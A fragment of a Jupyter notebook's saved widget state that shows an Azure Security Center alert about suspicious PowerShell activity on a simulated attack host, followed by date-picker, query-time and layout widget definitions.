<th>SourceComputerId</th>\n      <td>e72f40cd-a7d2-4a41-8562-3f32da204b36</td>\n    </tr>\n    <tr>\n      <th>AlertType</th>\n      <td>SCUBA_PSINSIGHT</td>\n    </tr>\n    <tr>\n      <th>ConfidenceLevel</th>\n      <td>Unknown</td>\n    </tr>\n    <tr>\n      <th>ConfidenceScore</th>\n      <td>NaN</td>\n    </tr>\n    <tr>\n      <th>IsIncident</th>\n      <td>False</td>\n    </tr>\n    <tr>\n      <th>StartTimeUtc</th>\n      <td>2019-09-12 21:37:27</td>\n    </tr>\n    <tr>\n      <th>EndTimeUtc</th>\n      <td>2019-09-12 21:37:27</td>\n    </tr>\n    <tr>\n      <th>ProcessingEndTime</th>\n      <td>2019-09-12 21:37:32</td>\n    </tr>\n    <tr>\n      <th>RemediationSteps</th>\n      <td>[\\r\\n  \"Review with WINATTACKSIM\\\\AttackAdmin the suspicious script in this alert to see if you ...</td>\n    </tr>\n    <tr>\n      <th>ExtendedProperties</th>\n      <td>{'Compromised Host': 'WINATTACKSIM', 'User Name': 'WINATTACKSIM\\AttackAdmin', 'Account Session I...</td>\n    </tr>\n    <tr>\n      <th>Entities</th>\n      <td>[{'$id': '4', 'DnsDomain': '', 'NTDomain': '', 'HostName': 'WINATTACKSIM', 'NetBiosName': 'WINAT...</td>\n    </tr>\n    <tr>\n      <th>SourceSystem</th>\n      <td>Detection</td>\n    </tr>\n    <tr>\n      <th>WorkspaceSubscriptionId</th>\n      <td>40dcc8bf-0478-4f3b-b275-ed0a94f2c013</td>\n    </tr>\n    <tr>\n      <th>WorkspaceResourceGroup</th>\n      <td>asihuntomsworkspacerg</td>\n    </tr>\n    <tr>\n      <th>ExtendedLinks</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>ProductName</th>\n      <td>Azure Security Center</td>\n    </tr>\n    <tr>\n      <th>ProductComponentName</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>Type</th>\n      <td>SecurityAlert</td>\n    </tr>\n    <tr>\n      <th>CompromisedEntity</th>\n      <td>WINATTACKSIM</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
          "text/plain": "                                                                                                                        2202\nTenantId                                                                                52b1ab41-869e-4138-9e40-2a4457f09bf0\nTimeGenerated                                                                                            2019-09-12 21:37:31\nAlertDisplayName                                                                     Suspicious Powershell Activity Detected\nAlertName                                                                            Suspicious Powershell Activity Detected\nSeverity                                                                                                                High\nDescription              Analysis of host data detected a powershell script running on WINATTACKSIM that has features in ...\nProviderName                                                                                                       Detection\nVendorName                                                                                                         Microsoft\nVendorOriginalId                                                                        d7a3b4c4-1794-40d8-bc60-19315106dba3\nSystemAlertId                                                       2518339765525617422_d7a3b4c4-1794-40d8-bc60-19315106dba3\nResourceId               /subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/provide...\nSourceComputerId                                                                        e72f40cd-a7d2-4a41-8562-3f32da204b36\nAlertType                                                                                                    SCUBA_PSINSIGHT\nConfidenceLevel                                                                                                      Unknown\nConfidenceScore                                                                                                          NaN\nIsIncident                                                                                                             False\nStartTimeUtc                                                                                             2019-09-12 21:37:27\nEndTimeUtc                                                                                               2019-09-12 21:37:27\nProcessingEndTime                                                                                        2019-09-12 21:37:32\nRemediationSteps         [\\r\\n  \"Review with WINATTACKSIM\\\\AttackAdmin the suspicious script in this alert to see if you ...\nExtendedProperties       {'Compromised Host': 'WINATTACKSIM', 'User Name': 'WINATTACKSIM\\AttackAdmin', 'Account Session I...\nEntities                 [{'$id': '4', 'DnsDomain': '', 'NTDomain': '', 'HostName': 'WINATTACKSIM', 'NetBiosName': 'WINAT...\nSourceSystem                                                                                                       Detection\nWorkspaceSubscriptionId                                                                 40dcc8bf-0478-4f3b-b275-ed0a94f2c013\nWorkspaceResourceGroup                                                                                 asihuntomsworkspacerg\nExtendedLinks                                                                                                               \nProductName                                                                                            Azure Security Center\nProductComponentName                                                                                                        \nType                                                                                                           SecurityAlert\nCompromisedEntity                                                                                               WINATTACKSIM"
         },
         "metadata": {},
         "output_type": "display_data"
        }
       ]
      }
     },
     "1380d313b0fd42468bbf11609769a011": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_17c5d81847e249dc80a0c845688fd93c",
       "style": "IPY_MODEL_b4cb865d8917495888566a9621ec3282",
       "value": "2019-02-05 06:15:06"
      }
     },
     "150f3964faf04ed2a034064d02024092": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "15a7350e57d649619e74f873b307c2a2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_606376fb63ae4f78918d8e18c4accb37",
       "style": "IPY_MODEL_6f76ed87803d440bb8535640b6b08d1e",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "1636cdc955af42ddb935557592db7eef": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_5f0cc2583a6c4d079dd349abf88c8b80",
       "style": "IPY_MODEL_fc9f2607345d45099f280cd92d083616",
       "value": {
        "date": 10,
        "month": 1,
        "year": 2019
       }
      }
     },
     "17b75093b2d04548ad3bda3e263c7355": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_d4c3e573cde24c858ae3186d5a6f21c4",
       "style": "IPY_MODEL_9e101b08df5f42079fcf823e94910f28",
       "value": "2019-02-05 06:15:06"
      }
     },
     "17bca77c9fc542e48bad919811cb0625": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_242347531b294637abe4a09df68e7c7e",
       "style": "IPY_MODEL_a9cb3490c25e490bb4998840da3d8443",
       "value": "2019-02-10 05:15:06"
      }
     },
     "17c5d81847e249dc80a0c845688fd93c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "17d313558e8f4c6fa49aa6c0652b66b9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "1817bc13292247c783a9c6e8190e0240": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_69aff5ed34ce49c8bd8f3acf0119e16c",
       "style": "IPY_MODEL_c8ccd30004f64726827d1af906095a13",
       "value": "2019-02-10 06:25:06"
      }
     },
     "1842a582d94c419abd006d6ed49cbf09": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "185743dfde4248c191ba75a3afb9f571": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "186ffe3cfbf04073a8c4a3aac3d0edfe": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "19fa2411590f4507ba3e9e8caebee8f6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "1a824f44bcf04b3d887a5e610233ca11": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_52d8b6ec04424d509eb78d328914a3d9",
       "style": "IPY_MODEL_fcb3fb4f92f148978adfd72483ac6b8f",
       "value": {
        "date": 10,
        "month": 1,
        "year": 2019
       }
      }
     },
     "1c653f39ba3940f4af33ae8f2cc1c7c5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "1cc69ebc6f404cb3b9c6af538451edaf": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_af13e8700564423cb5c5c7e37ea0c0f0",
       "style": "IPY_MODEL_bb88a9f403734c769682b50ac440928d",
       "value": "2019-09-07 21:37:31"
      }
     },
     "1e2f36606d8f45199e0adb4ae2ca813d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "1f21c20a8df941cd95b02035b922f55f": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_d259a6bec22e4d538d6ab72ac334f51d",
        "IPY_MODEL_1cc69ebc6f404cb3b9c6af538451edaf",
        "IPY_MODEL_fce43129342a40f4bd192d123879e71e"
       ],
       "layout": "IPY_MODEL_150f3964faf04ed2a034064d02024092"
      }
     },
     "1f9853ff11df4ede8c2ba272a38b067d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "213021eed9a84c4b8cce8949c0d0e948": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "23d565d3cc9e4affbe241267b91486f1": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_0c67b40355cd43d4b32aad2210518845",
       "max": 10,
       "min": -20,
       "style": "IPY_MODEL_fc34c476a23a4a06af28933279b25eb2",
       "value": [
        -5,
        1
       ]
      }
     },
     "23e8b896c4254270809a94cdf4f9d972": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "242347531b294637abe4a09df68e7c7e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "24a7e281e55c437ea99d64f39b86160e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_484d39972fe34e339c5d5ec9fc585258",
        "IPY_MODEL_d36c41a637db401b947fd4487d5cb005",
        "IPY_MODEL_0b77b52b7c824ec0ab95d46154444ecc"
       ],
       "layout": "IPY_MODEL_1199de3cc3564fbab2352ef892645f7c"
      }
     },
     "28175d0483bb4e2d8b4cc046265b959f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "28720056a4be44c18a406ab517273e94": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "29d71838a6514018b87bfe549afd5f2f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "2a1d8c6537a943aa983953c6544c9e8a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_756b50acaf27453992cb338aa29ae7c6",
       "style": "IPY_MODEL_ee6b988ae21b4691aa18654afb8f13f6",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "2abfea1a19944f36bc42d99470a717ff": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_c90581a762c54b41b113ba9516d77909",
        "IPY_MODEL_36d37431d08f48e5ba524e31e2b3581a"
       ],
       "layout": "IPY_MODEL_3db6137c18e4488fa1d6e9d5f5ca552f"
      }
     },
     "2b1e8041097845ec95b1b1f0ad3664b9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_f6e94341d6c341b58a676aaa233cfd03",
       "style": "IPY_MODEL_7b22f2aa474c47c793fb79327ddd3784",
       "value": "2019-09-12 22:30:30.145032"
      }
     },
     "2b52a3e9d29c4759ac7bec58885e0373": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_41c82aade69d4351a1ed937ebd043790",
        "IPY_MODEL_0feacac721a4438384b46d78ec29fbeb",
        "IPY_MODEL_11b28b5bccec48168bd0973a256fa83d"
       ],
       "layout": "IPY_MODEL_8824bf504a1d4b41be7a13e3a98c156e"
      }
     },
     "2bafe628a09d47869526d77b16af7a1a": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "2f0deff18fbd47f6be99656a00a2218c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "30424672831b4d328a4847fd055419ed": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "30733e60125342d09307c47ea512e85b": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "311d94ad2ad2401c8fbb1cbd5f835ab7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "31735f4634794cc1815d1cee6d7cb6fa": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "3220bf1b1804478086827606b4d2d2b8": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "3276da8638ef4a7f93310e88c7599465": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "328dad562fc248888baa7c9be2e00ef0": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "34964c6c547047019f309f7b9a003289": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_0ccb79571f3a4f009f5cb8dea6c018dc",
       "style": "IPY_MODEL_17d313558e8f4c6fa49aa6c0652b66b9",
       "value": "2019-09-12 01:30:30.145032"
      }
     },
     "355e8ac0751c4f009ced684fc34030e0": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "36d37431d08f48e5ba524e31e2b3581a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_6824d58b877148f68824f3ef0a0aacf9",
       "style": "IPY_MODEL_1f9853ff11df4ede8c2ba272a38b067d",
       "value": "05:38:41"
      }
     },
     "3a6eb231c8984762b3e4b9f8063bc165": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_ab68b1a072c147db80c7140aeb7b4cb4",
       "max": 1,
       "min": -20,
       "style": "IPY_MODEL_5ddfde8815764a18ab2f4bfb13d91715",
       "value": [
        -1,
        0
       ]
      }
     },
     "3a8067282175453e903235c4ddc5af6b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_718793d1c4be4f80843060015af8c16d",
        "IPY_MODEL_17bca77c9fc542e48bad919811cb0625",
        "IPY_MODEL_1817bc13292247c783a9c6e8190e0240"
       ],
       "layout": "IPY_MODEL_355e8ac0751c4f009ced684fc34030e0"
      }
     },
     "3be33d33e12f4d1c80dc7a9af2df532d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (hour):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_9ce002133ebe4b4ea6abe6b993d44df5",
       "max": 1,
       "min": -20,
       "style": "IPY_MODEL_f21946eff18c40daad9a142ce6137d32",
       "value": [
        -20,
        1
       ]
      }
     },
     "3c6c46603e94470aa85022f636a376d6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "3c98b438045648abbabe5109bbc6c814": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_d702c19f83ed48a28490fcf9a3f71136",
       "style": "IPY_MODEL_5ced29a773fb489c800c5093adb56742",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "3cc288f2b6e84398b863b5024422e7f1": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_429708f4546645848c7ef69688363929",
       "style": "IPY_MODEL_042ba29826d340058fea4f6e32bb69a9",
       "value": "2019-09-12 20:07:31"
      }
     },
     "3db6137c18e4488fa1d6e9d5f5ca552f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "3eb699e9e14e49d4ab7233aa332277c3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_560b7376bda04be8973ab6149fb44da8",
        "IPY_MODEL_ae65e95709904858a6afa3e639f4a39d"
       ],
       "layout": "IPY_MODEL_bff971b661bc448a94bf453f656e1501"
      }
     },
     "417c43a34d0e48eca6770bd1293b1f17": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_56210b1d7174438997701b14c4015c6e",
       "style": "IPY_MODEL_0e149e64bf2844d7a9162c523498cd95",
       "value": "05:38:41"
      }
     },
     "41c82aade69d4351a1ed937ebd043790": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Filter alerts by title:",
       "description_tooltip": null,
       "layout": "IPY_MODEL_aca4f790a681450c9159c94edd2711fc",
       "style": "IPY_MODEL_82f922f7b1cf4ecdb516f585161ba208",
       "value": "power"
      }
     },
     "429708f4546645848c7ef69688363929": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "4385d9fe8bbe46a2b203bb1564643744": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_e5c9f3edc40c4af7bcfdb575ecd1e483",
       "style": "IPY_MODEL_f6ddd86c568f42f79794477ebe27a15c",
       "value": "06:15:06"
      }
     },
     "43fd937b357a44b9a1a47c55cd892e18": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "449a956445fe4fa1a7d3327cbd27be29": {
      "model_module": "@jupyter-widgets/controls",
